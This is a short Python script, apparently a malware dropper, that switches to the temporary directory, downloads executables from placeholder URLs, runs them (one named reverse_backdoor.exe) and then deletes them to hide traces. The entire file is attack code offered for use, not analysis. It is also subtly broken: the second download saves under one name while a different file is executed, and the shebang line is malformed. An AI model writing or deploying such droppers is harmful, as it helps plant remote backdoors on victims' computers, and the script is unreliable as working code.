#!/usr/bin/env/ python

import requests
import subprocess
import os
import tempfile

def download(url):
    # Send a GET request to download the file from the specified URL
    get_response = requests.get(url)
    # Extract the file name from the URL
    file_name = url.split("/")[-1]
    # Write the content of the downloaded file to a local file
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)

# Get the path to the system's temporary directory
temp_directory = tempfile.gettempdir()
# Change the current working directory to the temporary directory
os.chdir(temp_directory)

# Download and execute the first file
download("URL......file.exe")
# Execute the downloaded file using subprocess.Popen
subprocess.Popen("file.exe", shell=True)

# Download and execute the second file
download("URL......file.exe")
# Execute the downloaded file using subprocess.call
subprocess.call("reverse_backdoor.exe", shell=True)

# Remove the downloaded files from the temporary directory
os.remove("file.exe")
os.remove("reverse_backdoor.exe")

